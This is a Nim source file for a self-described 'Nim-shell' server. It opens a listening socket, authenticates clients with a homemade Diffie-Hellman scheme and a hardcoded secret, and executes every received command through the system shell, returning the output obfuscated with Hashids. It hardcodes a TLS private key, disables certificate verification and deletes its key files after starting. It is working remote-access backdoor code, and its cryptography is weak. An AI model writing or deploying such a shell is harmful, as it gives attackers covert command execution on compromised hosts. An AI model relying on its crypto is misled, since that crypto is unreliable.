import net
import nativesockets
import osproc
import strutils
import os
import json
import options
import random
import math
import bitops
import algorithm
import argparse
import hashids
import std/sha1

const SECRET: string = "1234"
const SSL: bool = true
const CERTFILE = "server.pem"
const KEYFILE = "key.pem"
const CERT: string = """-----BEGIN CERTIFICATE-----
MIIC2DCCAcACCQCKi1QTXGir9jANBgkqhkiG9w0BAQsFADAuMQswCQYDVQQGEwJV
UzELMAkGA1UECAwCTkUxEjAQBgNVBAcMCVNPbWUgQ2l0eTAeFw0yMjA0MTkwMDQw
NDNaFw0yMzA0MTkwMDQwNDNaMC4xCzAJBgNVBAYTAlVTMQswCQYDVQQIDAJORTES
MBAGA1UEBwwJU09tZSBDaXR5MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
AQEA0mm7DSX+oN0rYh75RNRZNgdyTT1AmsbImhAxjf4pY3q/RHeaaKh0eqb0OqbL
IK1UrCHwJg2hAuKIFlL5ctJkYNjrle9MfXU3fj/MvBghTAWzV+++r95cM7NQbhkk
61Mb6mB0S4LERwdMRrTOYwYp2olmT5vOENRJda66uG1H33mLVkyIY+8S7eJD5tta
bTyOz7wlX1IjAOmwEuWrf801rghBKdnAEboP2DxZJD+nNSu5GnVpp6vSj9dZUhF3
wqDzm71Op42R/HH4efwJcAxIuDlY1//ahPNIMs3TKftK1ktcp4OwqEbfpKUld89S
btL8R1AsG9kuU341oN4jtS1RXQIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQAAdWFO
uh1SUWKLTsGtvWaRFzkLtSjjXLJGq2CLPexzEh6tp6A3q+gx9Ti2nBL/RoVz/A0P
HIIDpIYNxt14hyTgjW6RLC/UKEG97XXK16gzhFFMl/3PbmV2K55fotX8H+ctWruR
DFsQiet1Jd/Do69tiXJUGmclpcM+YcwDR0uwfW6rxa+6CgqhaOmc5becMaWc5DAs
pU8PChXufyOfBlGoQNBJzBiiJINHyBwizLPUQfCjGPqV6DndQhrciXI2/HQdylQL
FJSKTr8V9Od/AeFSUxf9duGjf7oIj2PXScNJSPXBat3nlTd3DwC7XQEGalUGMkeD
j4vodDMhkzqnXIi0
-----END CERTIFICATE-----"""
const KEY: string = """-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDSabsNJf6g3Sti
HvlE1Fk2B3JNPUCaxsiaEDGN/iljer9Ed5poqHR6pvQ6pssgrVSsIfAmDaEC4ogW
Uvly0mRg2OuV70x9dTd+P8y8GCFMBbNX776v3lwzs1BuGSTrUxvqYHRLgsRHB0xG
tM5jBinaiWZPm84Q1El1rrq4bUffeYtWTIhj7xLt4kPm21ptPI7PvCVfUiMA6bAS
5at/zTWuCEEp2cARug/YPFkkP6c1K7kadWmnq9KP11lSEXfCoPObvU6njZH8cfh5
/AlwDEi4OVjX/9qE80gyzdMp+0rWS1yng7CoRt+kpSV3z1Ju0vxHUCwb2S5TfjWg
3iO1LVFdAgMBAAECggEAXdU8z05EUSSQdj9t1h4Ecq27cWqBZwSC7QGPt8zCVFSm
+zeDKm0FFLVjcMx1BWuGuQShfbbSOOEg4yO5jlT44p+Z39FJgSFG0AxPlwoDv01D
f1Gw7ejxoTS0B4U7C56ScmD1O79jHHHKuDVlXI+hFo3zjEjlCmhBIjP7nMdPJ/7S
MYn1hBdtLFUuKQLcdqND4fDU90nS6EJ3sU9qBeNMoXQ35T+5iNhVGJNDN/bQn6Qb
X6IGuh5GQ/YF/UlqhPOie8CJfKn1KWKtKKWCH+e3gtfbAp6RK7ao29YbQGxVsfbU
GHSaTehUY2x2ZeHbgqYmt0Rddqx1l8LbbkVa3h7hgQKBgQD9YfFimkQ8zA9uLU+M
mMiGMTilaa9ejOkrJK2yZ13XcZxGjYPwYGNHZcwQONLPQ+UoJXVhxur4TPYnu0QU
ajJLDCpuxyTzhBW6OsupdgtVMAR3kbOARb8CxeDL0tfI3yf9B9694rg9YJgyM9xO
KwBXZNL5yHI1Yq5nWlNvoBTYzQKBgQDUligtNxka8o4fViLoLq06PSx+ihl0W23I
km3C2KfTf88AAtcTFPx5kfOWwwJlI4e+hnrwPnglluEJVlbA5Ey/Ti9pCX6otPD0
RYHh5mbYSSChNGpYpnXolv9KhQ8G/9chwQdchv4Vu7+AevAmH8FA7ayLB/e1i2Rw
6KcJ5LGa0QKBgFlfTpEE8MSxBVBLUx+4VCJhAiX2HREwip3ZFhszMnpnbEPGbp8+
oEXytgOSx2ir/gwnCjwuuXpTSw/AkcbRnmOyKtVgELyD/lXtnyBqrpyhjzHNho7c
Cv+jZCMAf3QuoiAxwnMfoPSlOYmbmT1JFZm9ylyoQwBpijKSPZPF1xSRAoGBAM1t
dNGMpsP1lAUQFZdMU7UtnCuDg+l+2G2zokFhX3vvy7Z1CCS2aOuJcFxFgbD+TpR8
G5zAoRWh4UBGoHqxosBS61mTBUQ95YIHEOWc4dEriU59+i5EXTgvge8e+VCINfm2
MEjnYezaism7Awm0MeluQwfu4R4b3ymEiLX0uvOhAoGAbbP+RTB+UkpTlsxJrowy
nUHQF8k/Su7F1sAgbftqg21sVAyV5S++Y7qGkMckj01foAolUEC7uYTGL1fBdpQS
OlCfEFJFyIZJe9aopbGVMdv1UrzrosMi7l3LKhmVlCRjvUgWZ4FwAHwWLGfykam6
7SR7tsIOTB1NdddpasneAt8=
-----END PRIVATE KEY-----"""

type
    DH = object
        pub: int
        msg: string

    KEYCHAIN = object
        private: int
        public: int
        clientPublic: int
        sharedKey: string
        sharedSecret: int
        hashIds: Hashids
        prime: int
        root: int

proc power(a, b, p: int): int {.inline.} =
    var 
        x: int = a mod p
        y: int = b
        res: int = 1

    # x = x mod p

    while y > 0:
        if bitand(y , 1) == 1:
            res = (res * x) mod p

        y = floorDiv(y, 2)
        x = (x * x) mod p
    return res

proc check(n: int, s: seq): bool {.inline.} =
    var x = newSeq[int]()
    for i in s:
        if x.contains(i):
            return false
        else:
            x.add i
    x.setLen(0)    
    return true

proc findPrimitiveRoot(n: int): int {.inline.} =
    var 
        x = newSeq[int]()
        y = newSeq[int]()
        tot = 0

    for i in countup(100, 200):
        for j in countup(100, 200):
            var t = power(i, j, n)
            x.add t
        if check(n, x):
            tot = tot + 1
            y.add i
        x.setLen(0)

    for i, v in reversed(y):
        if bitand(v , 1) == 1:
            return v

proc getRandomPrime(): int {.inline.} =

    randomize()

    var prime:int = 5023
    const randRange: int = 2000
    let 
        randHigh: int = rand(3000..10000)
        randLow: int = randHigh - randRange

    for n in countdown(randHigh, randLow):
        var isPrime = true

        for num in countdown(floorDiv(n, 2), 2):
            if n mod num == 0:
                isPrime = false
        
        if isPrime:
            prime = n
            break

    return prime

proc calcPublicKey(g, x, p: int): int =
    return power(g, x, p)

proc calcSecretKey(s, k, p: int): int =
    return power(s, k, p)

proc toString(str: seq[char]): string =
    result = newStringOfCap(len(str))
    for ch in str:
        add(result, ch)

proc encodeMsg(m: string, h: Hashids): string =
    #let hid: Hashids = createHashids(k & s)
    return h.encode(m.mapIt(it.ord))

proc decodeMsg(m: string, h: Hashids): string =
    var 
        d: seq[int] = h.decode(m)
        c: seq[char] = d.mapIt(it.chr)
    return toString(c)

proc generateKeys(): KEYCHAIN =
    let 
        primeNumber: int = getRandomPrime()
        primitiveRoot: int = findPrimitiveRoot(primeNumber)
        privateKey: int = getRandomPrime()
        pubKey: int = calcPublicKey(primitiveRoot, privateKey, primeNumber)
    return KEYCHAIN(private: privateKey, public: pubKey, prime: primeNumber, root: primitiveRoot, sharedKey: SECRET)

proc verifyClient(k: KEYCHAIN, j: string, v: bool): (KEYCHAIN, bool) =
        var kc = k
        try:
            let 
                jsonData = parseJson(j)
                dh: DH = to(jsonData, DH)
                clientPubKey: int = dh.pub
                clientMsg: string = dh.msg
                secret: int = calcSecretKey(clientPubKey, k.private, k.prime)
                hids: Hashids = createHashids(SECRET & $secret)
                dec = secureHash(encodeMsg("Success", hids))
            
            if $dec == clientMsg:
                if v:
                    echo "Server: client authenticated"

                kc.clientPublic = clientPubKey
                kc.sharedSecret = secret
                kc.hashIds = hids

                return (kc, true)
            else:
                if v:
                    echo "Server: client authenticaation failed"
                return (k, false)
                
        except JsonParsingError:
            if v:
                echo "Server: client json parse error"
            return (k, false)

proc main(port: int, ssl, verbose: bool) = 
    
    var 
        run = true
        server: Socket = newSocket()
        clients: seq[Socket] = @[]
        clientsToRemove: seq[int] = @[]
        secrets: seq[KEYCHAIN] = @[]

    # Start the server and bind to port
    server.setSockOpt(OptReuseAddr, true)
    server.getFd().setBlocking(false)
    server.bindAddr(Port(port))
    server.listen()

    # If SSL, wrap the socket. Delete crt and key after start. 
    if ssl:
        var ctx = newContext(certFile = CERTFILE, keyFile = KEYFILE, verifyMode = CVerifyNone)
        wrapSocket(ctx, server)
        discard execProcess("rm -f server.pem key.pem")

    if verbose:
        echo "Server: listening on ", port

    # Handle client connections
    while run:
        try:
            var 
                client: Socket = new(Socket)
                keychain: KEYCHAIN
                jsonObject: JsonNode
                isValidated: bool = false

            server.accept(client)
            
            if verbose:
                echo "Server: client connected"

            # Generate keys and send to client
            keychain = generateKeys()
            jsonObject = %* {"base": keychain.root, "prime": keychain.prime, "pub": keychain.public}
            client.send($jsonObject & "\r\L")

            let recvJson = client.recvLine(timeout = 10)
            (keychain, isValidated) = verifyClient(keychain, recvJson, verbose)

            if isValidated:
                clients.add(client)
                var idMsg: SecureHash = secureHash(encodeMsg("Connected", keychain.hashIds))
                jsonObject = %* {"msg": $idMsg}
                client.send($jsonObject & "\r\L")

                secrets.add keychain
            else:
                client.close()
        except OSError:
            discard

        for index, client in clients:
            try:
                var 
                    keychain: KEYCHAIN
                    command: string = " "

                let raw: string = client.recvLine(timeout = 10)
                    
                for i, k in secrets:
                    if index == i:
                        keychain = k

                command = decodeMsg(raw, keychain.hashIds)

                if command == "":
                    clientsToRemove.add(index)
                elif command == "shutdown":
                    run = false
                elif command == "cd" or command == "cd ":
                    client.send(encodeMsg("Must specify path", keychain.hashIds) & "\r\L\r\L")
                elif command.startsWith("cd"):
                    let dir = command.split()[1]

                    if len(dir) > 0:
                        try: 
                            os.setCurrentDir(dir)
                            var result = os.getCurrentDir()
                            client.send(encodeMsg(result, keychain.hashIds) & "\r\L\r\L")
                        except OSError:
                            client.send(encodeMsg("Directory doesn't exist!", keychain.hashIds) & "\r\L\r\L")
                    else:
                        client.send(encodeMsg("Must specify path", keychain.hashIds) & "\r\L\r\L")
                else:
                    try: 
                        var result = execProcess(command)
                        client.send(encodeMsg(result, keychain.hashIds) & "\r\L\r\L")
                    except OSError:
                        discard

            except TimeoutError:
                discard

        for index in clientsToRemove:
            clients.del(index)
            secrets.del(index)
            if verbose:
                echo "Server: Client disconnected"

    server.close()
    system.quit(0)

var p = newParser:
    help("Nim-shell server")
    flag("-v", "--verbose", help="Enable verbost output for debugging")
    option("-p", "--port", help="Target port", required=false)
    
try: 
    var x = p.parse(commandLineParams())

    if SSL:
        writeFile("server.pem", CERT)
        writeFile("key.pem", KEY)
    
    main(parseInt(x.port), SSL, x.verbose)
except ShortCircuit as e:
    if e.flag == "argparse_help":
        echo p.help
        quit(1)
except UsageError:
    stderr.writeLine getCurrentExceptionMsg()
    quit(1)